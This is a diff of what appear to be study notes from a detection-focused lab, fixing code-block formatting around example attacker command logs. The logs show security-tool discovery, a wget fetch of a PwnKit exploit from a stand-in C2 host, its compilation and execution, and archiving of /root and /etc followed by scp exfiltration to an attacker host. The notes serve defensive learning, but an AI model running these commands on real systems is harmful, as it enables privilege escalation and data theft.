@@ -19,19 +19,22 @@ Przykład: grep -E "[0-9]{1,3}" (szuka od jednej do trzech cyfr).
 ```
 ## Notatki
 ### Detection 1: A Spike of Discovery Commands
-```whoami                                                # Returns "www-data" user
+```
+whoami                                                # Returns "www-data" user
 id; pwd; ls -la; crontab -l                           # Basic initial Discovery
 ps aux | egrep "edr|splunk|elastic"                   # Security tools Discovery
 uname -r                                              # Returns an old 4.4 kernel
 ```
 ### Detection 2: A Download to Temp Directory
-```wget http://c2-server.thm/pwnkit.c -O /tmp/pwnkit.c   # Pwnkit exploit download
+```
+wget http://c2-server.thm/pwnkit.c -O /tmp/pwnkit.c   # Pwnkit exploit download
 gcc /tmp/pwnkit.c -o /tmp/pwnkit                      # Pwnkit exploit compilation
 chmod +x /tmp/pwnkit                                  # Making exploit executable
 /tmp/pwnkit                                           # Trying to use the exploit
 ```
 ### Detection 3: Data Exfiltration With SCP
-```whoami                                                # Now returns "root" user
+```
+whoami                                                # Now returns "root" user
 tar czf dump.tar.gz /root /etc/                       # Archiving sensitive data
 scp dump.tar.gz attacker@c2-server.thm:~              # Exfiltrating the data
 ```
